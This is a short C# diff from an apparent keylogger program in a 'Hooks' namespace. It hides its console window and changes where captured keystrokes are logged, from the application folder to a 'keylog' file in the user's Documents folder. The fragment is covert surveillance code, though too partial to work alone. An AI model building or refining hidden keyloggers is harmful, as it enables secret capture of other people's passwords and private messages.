@@ -13,8 +13,8 @@ namespace Hooks
         static void Main(string[] args)
         {
             var handle = GetConsoleWindow();
-
-            var kl = new KeyLogger(Application.StartupPath + @"\log.txt");
+            string path = Environment.GetFolderPath(Environment.SpecialFolder.Personal) +"\\keylog";
+            var kl = new KeyLogger(path);
             // Hide
             ShowWindow(handle, SW_HIDE);
 
